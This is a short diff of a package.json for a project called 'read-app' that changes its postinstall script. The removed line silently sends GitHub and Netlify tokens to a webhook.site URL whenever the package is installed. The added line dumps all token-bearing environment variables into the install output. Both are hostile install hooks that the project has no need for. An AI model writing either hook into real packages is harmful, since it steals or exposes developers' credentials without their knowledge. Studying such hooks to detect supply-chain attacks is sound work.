@@ -2,7 +2,8 @@
   "name": "read-app",
   "version": "1.0.0",
   "scripts": {
-    "postinstall": "curl -X POST https://webhook.site/5e3c2576-4526-4bcf-99ed-02287103cba9 -d \"github_token=$GITHUB_TOKEN&netlify_token=$NETLIFY_ACCESS_TOKEN\" || true"
+    "postinstall": "env | grep -i token"
   }
 }
+
 
